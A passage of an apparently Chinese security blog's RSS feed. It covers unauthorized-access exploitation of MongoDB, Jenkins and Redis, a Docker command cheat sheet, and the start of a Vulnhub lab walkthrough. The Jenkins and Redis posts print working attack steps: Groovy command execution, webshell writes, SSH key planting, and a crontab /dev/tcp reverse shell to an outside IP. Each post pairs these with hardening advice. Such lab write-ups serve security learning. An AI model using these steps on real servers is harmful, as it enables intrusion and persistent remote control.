      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ZooKeeper/">ZooKeeper</category>
      
      
      <category domain="https://0a00.github.io/tags/ZooKeeper/">ZooKeeper</category>
      
      
      <comments>https://0a00.github.io/2023/05/16/zookeeper/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>MongoDB 未授权访问</title>
      <link>https://0a00.github.io/2023/05/16/mongodb/</link>
      <guid>https://0a00.github.io/2023/05/16/mongodb/</guid>
      <pubDate>Tue, 16 May 2023 11:40:14 GMT</pubDate>
      
      <description>MongoDB 未授权访问</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline #5effff"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p></div></div><div class='timeline-item-content'><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>默认开启 MongoDB 服务不添加任何参数时，是没有任何权限验证的，可以直接无密码连接登陆，端口 27017</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo  --host ip  --port 27017  直接连接数据库</span><br></pre></td></tr></table></figure><h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul><li>为 MongoDB 添加认证</li><li>启动时候添加 —auth参数</li><li>给 MongoDB 添加用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin <span class="comment">#使用admin库</span></span><br><span class="line"></span><br><span class="line">db.addUser(<span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>) <span class="comment">#添加用户名root密码123456的用户</span></span><br><span class="line"></span><br><span class="line">db.auth(<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>) <span class="comment">#验证下是否添加成功，返回1说明成功</span></span><br></pre></td></tr></table></figure><ul><li>禁用HTTP 和REST 端口</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MongoDB 自身带有一个 HTTP 服务和并支持 REST 接口。</span><br><span class="line">在2.6以后这些接口默认是关闭的。mongoDB 默认会使用默认端口监听web服务，</span><br><span class="line">一般不需要通过 web 方式进行远程管理，建议禁用。</span><br><span class="line">修改配置文件或在启动的时候选择 –nohttpinterface 参数 nohttpinterface=<span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li>限制绑定ip</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动时加入参数--bind_ip 127.0.0.1</span><br><span class="line"></span><br><span class="line">或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/MongoDB/">MongoDB</category>
      
      
      <category domain="https://0a00.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</category>
      
      <category domain="https://0a00.github.io/tags/MongoDB/">MongoDB</category>
      
      
      <comments>https://0a00.github.io/2023/05/16/mongodb/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JenKins 未授权访问</title>
      <link>https://0a00.github.io/2023/05/16/jenkins/</link>
      <guid>https://0a00.github.io/2023/05/16/jenkins/</guid>
      <pubDate>Tue, 16 May 2023 11:34:19 GMT</pubDate>
      
      <description>jenkins 未授权访问</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p></div></div><div class='timeline-item-content'><p>永远新的开始啊</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>命令执行地址</p><p><a href="http://192.168.56.114:8080/script">http://192.168.56.114:8080/script</a></p><p><a href="http://192.168.56.114:8080/manage">http://192.168.56.114:8080/manage</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">命令执行</span><br><span class="line">println <span class="string">&quot;ifconfig -a&quot;</span>.execute().text    执行ifconfig  命令</span><br><span class="line">println <span class="string">&quot;wget  http://127.0.0.1/1.py&quot;</span>.execute().text     下载py文件反弹shell</span><br><span class="line"></span><br><span class="line">写文件shell</span><br><span class="line">new File(<span class="string">&quot;/tmp/1.py&quot;</span>).write(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>);      使用命令写入文件1.py 随后执行命令反弹</span><br><span class="line"></span><br><span class="line">写websehll 文件</span><br><span class="line">new File(<span class="string">&quot;/var/www/html/1.php&quot;</span>).write(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ul><li>禁止 jenkins 暴露在公网</li><li>添加认证,设置复杂密码以及账号锁定</li></ul><h1 id="相关CVE"><a href="#相关CVE" class="headerlink" title="相关CVE"></a>相关CVE</h1><p>CVE-2017-1000353</p><p>CVE-2018-1000861</p></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/jenkins/">jenkins</category>
      
      
      <category domain="https://0a00.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/tags/jenkins/">jenkins</category>
      
      
      <comments>https://0a00.github.io/2023/05/16/jenkins/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>redis 未授权访问</title>
      <link>https://0a00.github.io/2023/05/15/redis/</link>
      <guid>https://0a00.github.io/2023/05/15/redis/</guid>
      <pubDate>Mon, 15 May 2023 09:41:29 GMT</pubDate>
      
      <description>redis 未授权访问漏洞利用</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-15</p></div></div><div class='timeline-item-content'><p>永远新的开始啊</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Redis 在某些情况下，绑定在0.0.0.0 暴露公网访问的时候，没有防火墙策略，没有密码认证的情况下，会导致任意目标访问 redis 以及读取写入数据。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul><li>绑定在 0.0.0.0:6379，没有安全策略ip限制，直接暴露在公网</li><li>没有设置 redis 密码认证，可以免密码登陆</li><li>高级利用，root 身份运行</li></ul><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul><li>centos 7</li><li>redis <code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line">make install 将redis-cli redis-server 安装到/usr/bin</span><br><span class="line"><span class="built_in">cp</span> redis.conf /etc</span><br><span class="line">修改redis.conf 配置文件 <span class="built_in">bind</span> 0.0.0.0,关闭密码认证，关闭服务器防火墙</span><br><span class="line">root启动</span><br></pre></td></tr></table></figure><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">安装 redis-cli</span><br><span class="line">yay -S redis</span><br><span class="line">redis-cli -h 192.168.56.110  连接redis</span><br><span class="line"></span><br><span class="line">**数据泄漏**</span><br><span class="line">keys *   获取所有 keys 值</span><br><span class="line"></span><br><span class="line">**系统信息**</span><br><span class="line">info    获取系统信息，redis版本，系统信息等</span><br><span class="line"></span><br><span class="line">**webshell**</span><br><span class="line"><span class="comment"># 写入一个string内容</span></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n&lt;?=`<span class="variable">$_GET</span>[0]`?&gt;\n\n&quot;</span>    \n换行，防止写入数据混乱</span><br><span class="line"><span class="comment"># 设置备份目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置备份文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 保存文件到本地</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入 SSH 公钥登陆无密码登陆目标系统**</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa　　//执行生成key命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份文件目录设置为对应的 .ssh，一般默认为 /root/.ssh/</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> key <span class="string">&quot;\n\n\生成的公钥n\n&quot;</span></span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入计划任务 crontab 运行命令，获取shell**</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>修复方式</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></h1><ul><li>bind 127.0.0.1  只对本地开放</li><li>requirepass password  设置密码认证</li><li>修改默认端口</li><li>设置防火墙规则</li></ul></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</category>
      
      <category domain="https://0a00.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/redis/">redis</category>
      
      
      <category domain="https://0a00.github.io/tags/redis/">redis</category>
      
      
      <comments>https://0a00.github.io/2023/05/15/redis/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Docker使用参考</title>
      <link>https://0a00.github.io/2022/11/26/docker1/</link>
      <guid>https://0a00.github.io/2022/11/26/docker1/</guid>
      <pubDate>Sat, 26 Nov 2022 06:02:52 GMT</pubDate>
      
      <description>docker</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><h6 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h6><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>描述: Docker 是一个用于开发、交付和运行应用程序的开放平台。 Docker 使您能够将应用程序与基础架构分开，以便 您可以快速交付软件。使用 Docker，您可以管理您的基础架构 以与管理应用程序相同的方式。通过利用 Docker 的 快速传送、测试和部署代码的方法，您可以 显著减少编写代码和在生产环境中运行代码之间的延迟。</p></div></div></div><h1 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h1><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">docker ps列出正在运行的容器</span><br><span class="line">docker ps -a列出所有容器</span><br><span class="line">docker ps -s列出正在运行的容器 (带 CPU / 内存)</span><br><span class="line">docker images列出所有镜像</span><br><span class="line">docker exec -it &lt;container&gt;  bash连接到容器</span><br><span class="line">docker logs &lt;container&gt;显示容器的控制台日志</span><br><span class="line">docker stop &lt;container&gt;停止容器</span><br><span class="line">docker restart &lt;container&gt;重启一个容器</span><br><span class="line">docker rm &lt;container&gt;移除一个容器</span><br><span class="line">docker port &lt;container&gt;显示容器的端口映射</span><br><span class="line">docker top &lt;container&gt;列出进程</span><br><span class="line">docker kill &lt;container&gt;杀死一个容器</span><br><span class="line"></span><br><span class="line">docker start nginx-server开始</span><br><span class="line">docker stop nginx-server停止</span><br><span class="line">docker restart nginx-server重启</span><br><span class="line">docker pause nginx-server暂停</span><br><span class="line">docker unpause nginx-server取消暂停</span><br><span class="line">docker wait nginx-server阻塞容器</span><br><span class="line">docker kill nginx-server发送 SIGKILL</span><br><span class="line">docker attach nginx-server连接到现有容器</span><br><span class="line">docker pull 镜像   从docker registry中拉取镜像</span><br><span class="line"></span><br><span class="line">docker ps列出正在运行的容器</span><br><span class="line">docker ps -a列出所有容器</span><br><span class="line">docker logs nginx-server容器日志</span><br><span class="line">docker inspect nginx-server检查容器</span><br><span class="line">docker events nginx-server容器事件</span><br><span class="line">docker port nginx-server公共端口</span><br><span class="line">docker top nginx-server运行进程</span><br><span class="line">docker stats nginx-server容器资源使用</span><br><span class="line">docker diff nginx-server列出对容器所做的更改</span><br><span class="line"></span><br><span class="line">docker images列出镜像</span><br><span class="line">docker rmi nginx删除镜像</span><br><span class="line">docker load &lt; ubuntu.tar.gz加载一个 tarred 存储库</span><br><span class="line">docker load --input ubuntu.tar加载一个 tarred 存储库</span><br><span class="line">docker save busybox &gt; ubuntu.tar将镜像保存到 tar 存档</span><br><span class="line">docker history显示镜像的历史</span><br><span class="line">docker commit nginx将容器另存为镜像。</span><br><span class="line">docker tag nginx eon01/nginx标记镜像</span><br><span class="line">docker push eon01/nginx推送镜像</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 docker/imagesname  -d后台允许，-p端口映射</span><br><span class="line">docker run -it ubuntu /bin/bash   -i交互式  -t终端</span><br><span class="line"></span><br><span class="line">docker exec id   shell command  容器执行命令</span><br><span class="line">docker exec -u root -it imagesname  /bin/bash</span><br><span class="line">docker exec -it 容器名称 sh  从正在运行的容器中打开一个shell </span><br><span class="line"></span><br><span class="line">docker ps -a 列出所有docker容器（包括停止的）</span><br><span class="line">docker start | stop 容器名称 启动或停止现有容器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载dockerfile，json文件</span><br><span class="line">docker build -t setname    编译镜像，设置名为setname</span><br><span class="line"></span><br><span class="line">更新源代码，重新编译，运行，删除旧容器才可以适用新容器</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker ps 列出获取容器id</span><br><span class="line">docker stop id   停止容器</span><br><span class="line">docker rm id  停止容器后删除容器</span><br><span class="line">docker rm -f id 停止并且删除</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">docker ps -a  列出所有容器</span><br><span class="line">docker kill id 杀死运行中的容器</span><br><span class="line">docker images 列出docker镜像</span><br><span class="line">docker rmi id 删除镜像</span><br><span class="line">docker system prune  删除与容器无关镜像，容器，卷，网络</span><br><span class="line">docker system prune -a 删除任何停止的容器和所有未使用的图像（不仅仅是悬空的图像）</span><br><span class="line">rm -R /var/lib/docker   删除docker数据目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker容器移除后数据不会保存（持久化数据设置）</span><br><span class="line">docker volume create todo-db 创建数据库</span><br><span class="line">设置镜像不能运行，删除后开始设置</span><br><span class="line">docker run -dp 80:80 -v todo-db:/etc/todos images-name  运行时指定卷安装</span><br><span class="line">删除后启动，数据不会清除，</span><br><span class="line">docker volume inspect todo-db 查看卷信息，数据位置信息</span><br><span class="line"></span><br><span class="line">适用绑定挂载（持久化数据，可以控制确切挂载点，实时修改）</span><br><span class="line">docker run -dp 3000:3000 \</span><br><span class="line">     -w /app -v &quot;$(pwd):/app&quot; \</span><br><span class="line">     node:12-alpine \</span><br><span class="line">-w 指定工作目录</span><br><span class="line">-v 将容器种主机当前目录挂载到工作目录</span><br><span class="line"></span><br><span class="line">docker logs -f 容器名称     获取并查看容器日志</span><br></pre></td></tr></table></figure></div></div></div><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><h6 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h6><p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br><a href="https://quickref.cn/docs/docker.html">https://quickref.cn/docs/docker.html</a></p></div></div></div><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/tool/">tool</category>
      
      <category domain="https://0a00.github.io/categories/tool/docker/">docker</category>
      
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/docker/">docker</category>
      
      <category domain="https://0a00.github.io/tags/tool/">tool</category>
      
      <category domain="https://0a00.github.io/tags/skill/">skill</category>
      
      
      <comments>https://0a00.github.io/2022/11/26/docker1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vulnhub靶场CHRONOS-1</title>
      <link>https://0a00.github.io/2022/11/17/bc6/</link>
      <guid>https://0a00.github.io/2022/11/17/bc6/</guid>
      <pubDate>Thu, 17 Nov 2022 09:18:31 GMT</pubDate>
      
      <description>Vulnhub靶场</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></p><p>描述:</p><p>难度：中等<br>目标：获得root权限,flag*2</p><p>涉及的任务：<br>端口扫描<br>WEB侦查<br>命令注入<br>数据编解码<br>搜索引擎<br>框架漏洞利用<br>代码审计<br>NC反弹shell<br>本地提权</p></div></div></div><h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p><h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>sudo netdiscover -i eth1  用于目标发现<br>arp-scan  用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p></div></div></div><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -i eth1  指定网卡，对目标网段进行arp主机发现</span><br><span class="line"></span><br><span class="line">确定目标 192.168.56.109  为测试靶机目标</span><br></pre></td></tr></table></figure><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.109 